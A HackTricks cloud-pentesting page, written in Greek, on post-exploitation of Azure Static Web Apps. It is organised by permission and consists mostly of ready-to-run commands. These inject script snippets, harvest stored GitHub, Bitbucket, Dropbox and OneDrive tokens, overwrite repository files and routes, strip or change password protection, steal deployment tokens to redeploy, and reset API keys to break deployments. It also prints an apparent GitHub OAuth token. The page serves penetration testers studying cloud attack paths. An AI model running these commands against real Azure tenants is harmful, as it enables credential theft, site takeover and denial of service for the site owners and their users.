# Az - Static Web Apps Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Azure Static Web Apps

Για περισσότερες πληροφορίες σχετικά με αυτή την υπηρεσία, ελέγξτε:

{{#ref}}
../az-services/az-static-web-apps.md
{{#endref}}

### Microsoft.Web/staticSites/snippets/write

Είναι δυνατόν να φορτώσετε μια στατική ιστοσελίδα με αυθαίρετο HTML κώδικα δημιουργώντας ένα snippet. Αυτό θα μπορούσε να επιτρέψει σε έναν επιτιθέμενο να εισάγει κώδικα JS μέσα στην εφαρμογή ιστού και να κλέψει ευαίσθητες πληροφορίες όπως διαπιστευτήρια ή μνημονικούς κωδικούς (σε πορτοφόλια web3).

Η παρακάτω εντολή δημιουργεί ένα snippet που θα φορτώνεται πάντα από την εφαρμογή ιστού::
```bash
az rest \
--method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/snippets/<snippet-name>?api-version=2022-03-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"name": "supersnippet",
"location": "Body",
"applicableEnvironmentsMode": "AllEnvironments",
"content": "PHNjcmlwdD4KYWxlcnQoIkF6dXJlIFNuaXBwZXQiKQo8L3NjcmlwdD4K",
"environments": [],
"insertBottom": false
}
}'
```
### Διαβάστε τις Ρυθμισμένες Πιστοποιήσεις Τρίτων

Όπως εξηγήθηκε στην ενότητα App Service:

{{#ref}}
../az-privilege-escalation/az-app-services-privesc.md
{{#endref}}

Εκτελώντας την παρακάτω εντολή είναι δυνατόν να **διαβάσετε τις πιστοποιήσεις τρίτων** που είναι ρυθμισμένες στον τρέχοντα λογαριασμό. Σημειώστε ότι αν για παράδειγμα κάποιες πιστοποιήσεις Github είναι ρυθμισμένες σε διαφορετικό χρήστη, δεν θα μπορείτε να αποκτήσετε πρόσβαση στο token από έναν διαφορετικό.
```bash
az rest --method GET \
--url "https://management.azure.com/providers/Microsoft.Web/sourcecontrols?api-version=2024-04-01"
```
Αυτή η εντολή επιστρέφει tokens για το Github, Bitbucket, Dropbox και OneDrive.

Εδώ έχετε μερικά παραδείγματα εντολών για να ελέγξετε τα tokens:
```bash
# GitHub – List Repositories
curl -H "Authorization: token <token>" \
-H "Accept: application/vnd.github.v3+json" \
https://api.github.com/user/repos

# Bitbucket – List Repositories
curl -H "Authorization: Bearer <token>" \
-H "Accept: application/json" \
https://api.bitbucket.org/2.0/repositories

# Dropbox – List Files in Root Folder
curl -X POST https://api.dropboxapi.com/2/files/list_folder \
-H "Authorization: Bearer <token>" \
-H "Content-Type: application/json" \
--data '{"path": ""}'

# OneDrive – List Files in Root Folder
curl -H "Authorization: Bearer <token>" \
-H "Accept: application/json" \
https://graph.microsoft.com/v1.0/me/drive/root/children
```
### Επικαλύψτε το αρχείο - Επικαλύψτε διαδρομές, HTML, JS...

Είναι δυνατόν να **επικαλύψετε ένα αρχείο μέσα στο αποθετήριο Github** που περιέχει την εφαρμογή μέσω του Azure, στέλνοντας ένα αίτημα όπως το παρακάτω, το οποίο θα υποδείξει τη διαδρομή του αρχείου που θα επικαλυφθεί, το περιεχόμενο του αρχείου και το μήνυμα δέσμευσης.

Αυτό μπορεί να καταχραστεί από επιτιθέμενους για να **αλλάξουν το περιεχόμενο της διαδικτυακής εφαρμογής** ώστε να εξυπηρετούν κακόβουλο περιεχόμενο (να κλέψουν διαπιστευτήρια, μνημονικές κλειδιά...) ή απλώς για να **ανακατευθύνουν ορισμένες διαδρομές** στους δικούς τους διακομιστές επικαλύπτοντας το αρχείο `staticwebapp.config.json`.

> [!WARNING]
> Σημειώστε ότι αν ένας επιτιθέμενος καταφέρει να παραβιάσει το αποθετήριο Github με οποιονδήποτε τρόπο, μπορεί επίσης να επικαλύψει το αρχείο απευθείας από το Github.
```bash
curl -X PUT "https://functions.azure.com/api/github/updateGitHubContent" \
-H "Content-Type: application/json" \
-d '{
"commit": {
"message": "Update static web app route configuration",
"branchName": "main",
"committer": {
"name": "Azure App Service",
"email": "donotreply@microsoft.com"
},
"contentBase64Encoded": "ewogICJuYXZpZ2F0aW9uRmFsbGJhY2siOiB7CiAgICAicmV3cml0ZSI6ICIvaW5kZXguaHRtbCIKICB9LAogICJyb3V0ZXMiOiBbCiAgICB7CiAgICAgICJyb3V0ZSI6ICIvcHJvZmlsZSIsCiAgICAgICJtZXRob2RzIjogWwogICAgICAgICJnZXQiLAogICAgICAgICJoZWFkIiwKICAgICAgICAicG9zdCIKICAgICAgXSwKICAgICAgInJld3JpdGUiOiAiL3AxIiwKICAgICAgInJlZGlyZWN0IjogIi9sYWxhbGEyIiwKICAgICAgInN0YXR1c0NvZGUiOiAzMDEsCiAgICAgICJhbGxvd2VkUm9sZXMiOiBbCiAgICAgICAgImFub255bW91cyIKICAgICAgXQogICAgfQogIF0KfQ==",
"filePath": "staticwebapp.config.json",
"message": "Update static web app route configuration",
"repoName": "carlospolop/my-first-static-web-app",
"sha": "4b6165d0ad993a5c705e8e9bb23b778dff2f9ca4"
},
"gitHubToken": "gho_1OSsm834ai863yKkdwHGj31927PCFk44BAXL"
}'
```
### Microsoft.Web/staticSites/config/write

Με αυτή την άδεια, είναι δυνατόν να **τροποποιήσετε τον κωδικό πρόσβασης** που προστατεύει μια στατική εφαρμογή ιστού ή ακόμη και να αφαιρέσετε την προστασία από κάθε περιβάλλον στέλνοντας ένα αίτημα όπως το παρακάτω:
```bash
# Change password
az rest --method put \
--url "/subscriptions/<subcription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/config/basicAuth?api-version=2021-03-01" \
--headers 'Content-Type=application/json' \
--body '{
"name": "basicAuth",
"type": "Microsoft.Web/staticSites/basicAuth",
"properties": {
"password": "SuperPassword123.",
"secretUrl": "",
"applicableEnvironmentsMode": "AllEnvironments"
}
}'

# Remove the need of a password
az rest --method put \
--url "/subscriptions/<subcription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/config/basicAuth?api-version=2021-03-01" \
--headers 'Content-Type=application/json' \
--body '{
"name": "basicAuth",
"type": "Microsoft.Web/staticSites/basicAuth",
"properties": {
"secretUrl": "",
"applicableEnvironmentsMode": "SpecifiedEnvironments",
"secretState": "None"
}
}'
```
### Microsoft.Web/staticSites/listSecrets/action

Αυτή η άδεια επιτρέπει την απόκτηση του **API key deployment token** για την στατική εφαρμογή.

Αυτό το token επιτρέπει την ανάπτυξη της εφαρμογής.
```bash
az rest --method POST \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/listSecrets?api-version=2023-01-01"
```
Στη συνέχεια, για να ενημερώσετε μια εφαρμογή, μπορείτε να εκτελέσετε την παρακάτω εντολή. Σημειώστε ότι αυτή η εντολή εξήχθη ελέγχοντας **πώς λειτουργεί το Github Action [https://github.com/Azure/static-web-apps-deploy](https://github.com/Azure/static-web-apps-deploy)**, καθώς είναι αυτή που έχει ορίσει το Azure ως προεπιλογή. Έτσι, η εικόνα και οι παράμετροι μπορεί να αλλάξουν στο μέλλον.

1. Κατεβάστε το repo [https://github.com/staticwebdev/react-basic](https://github.com/staticwebdev/react-basic) (ή οποιοδήποτε άλλο repo θέλετε να αναπτύξετε) και εκτελέστε `cd react-basic`.
2. Αλλάξτε τον κώδικα που θέλετε να αναπτύξετε
3. Αναπτύξτε το εκτελώντας (Θυμηθείτε να αλλάξετε το `<api-token>`):
```bash
docker run -it --rm -v $(pwd):/mnt mcr.microsoft.com/appsvc/staticappsclient:stable INPUT_AZURE_STATIC_WEB_APPS_API_TOKEN=<api-token> INPUT_APP_LOCATION="/mnt" INPUT_API_LOCATION="" INPUT_OUTPUT_LOCATION="build" /bin/staticsites/StaticSitesClient upload --verbose
```
### Microsoft.Web/staticSites/write

Με αυτή την άδεια είναι δυνατόν να **αλλάξετε την πηγή της στατικής εφαρμογής ιστού σε ένα διαφορετικό αποθετήριο Github**, ωστόσο, δεν θα προμηθευτεί αυτόματα καθώς αυτό πρέπει να γίνει από μια ενέργεια Github συνήθως με το διακριτικό που εξουσιοδότησε την ενέργεια, καθώς αυτό το διακριτικό δεν ενημερώνεται αυτόματα μέσα στα μυστικά του Github του αποθετηρίου (προστίθεται αυτόματα μόνο όταν δημιουργείται η εφαρμογή).
```bash
az staticwebapp update --name my-first-static-web-app --resource-group Resource_Group_1 --source https://github.com/carlospolop/my-first-static-web-app -b main
```
### Microsoft.Web/staticSites/resetapikey/action

Με αυτή την άδεια είναι δυνατόν να **επαναρυθμιστεί το API key της στατικής εφαρμογής ιστού**, ενδεχομένως προκαλώντας DoS στις ροές εργασίας που αναπτύσσουν αυτόματα την εφαρμογή.
```bash
az rest --method POST \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/resetapikey?api-version=2019-08-01"
```
{{#include ../../../banners/hacktricks-training.md}}
